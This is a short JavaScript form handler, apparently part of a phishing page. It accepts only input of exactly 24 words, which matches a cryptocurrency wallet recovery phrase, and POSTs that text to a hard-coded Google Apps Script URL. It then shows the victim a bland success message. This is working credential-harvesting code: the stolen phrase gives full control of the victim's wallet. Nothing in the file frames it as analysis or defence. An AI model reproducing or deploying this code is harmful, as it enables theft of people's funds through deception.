function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission
    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';

    const myButton = document.getElementById('b1');
    const myButton2 = document.getElementById('b2');
    myButton.disabled = true;
    myButton2.disabled = true;

    // Get the form element
    const form = document.getElementById('myForm'); // Use correct form ID
    if (!form) {
        console.error('Form not found!');
        return;
    }

    const inputField = form.elements['mf-texts'];
    if (!inputField) {
        console.error('Input field "mf-texts" not found!');
        return;
    }

    const inputValue = inputField.value.trim();
    const wordCount = inputValue.split(/\s+/).length;

    if (wordCount !== 24) {
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        return;
    }

    // Google Apps Script URL
    const url = "https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec";

    // Make a POST request to your Google Apps Script URL
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data: inputValue }) // Sending data as JSON
    })
    .then(response => response.json().catch(() => ({ error: "Invalid JSON response" })))
    .then(data => {
        errorElement.textContent = 'Data submitted successfully!';
        myButton.disabled = false;
        myButton2.disabled = false;
        if (form) form.reset();
    })
    .catch(error => {
        console.error('Error:', error);
        errorElement.textContent = 'Error occurred while processing your request.';
        myButton.disabled = false;
        myButton2.disabled = false;
    });
}

// Add event listener to the form
const form = document.getElementById('myForm'); // Ensure correct ID
if (form) {
    form.addEventListener('submit', handleSubmit);
} else {
    console.error('Form element not found!');
}







